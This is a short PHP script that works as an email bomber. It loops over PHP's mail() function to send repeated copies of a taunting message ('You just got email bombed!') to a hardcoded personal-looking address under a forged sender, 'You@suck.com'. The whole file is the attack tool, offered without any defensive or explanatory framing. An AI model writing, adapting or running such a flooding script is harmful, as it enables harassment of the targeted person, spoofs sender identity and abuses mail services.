<?php

$targetmail = "neus2benen@gmail.com";
$subject = "BOOM!";
$message = "You just got email bombed!";
$amount = 10;
$sentmail = 1; //Do not change
$frommail = "You@suck.com"; // sender


while($sentmail<=$amount)

{
	
	mail($targetmail, $subject, $message, "From: $frommail\n");
  $sentmail++;
	
}
?>
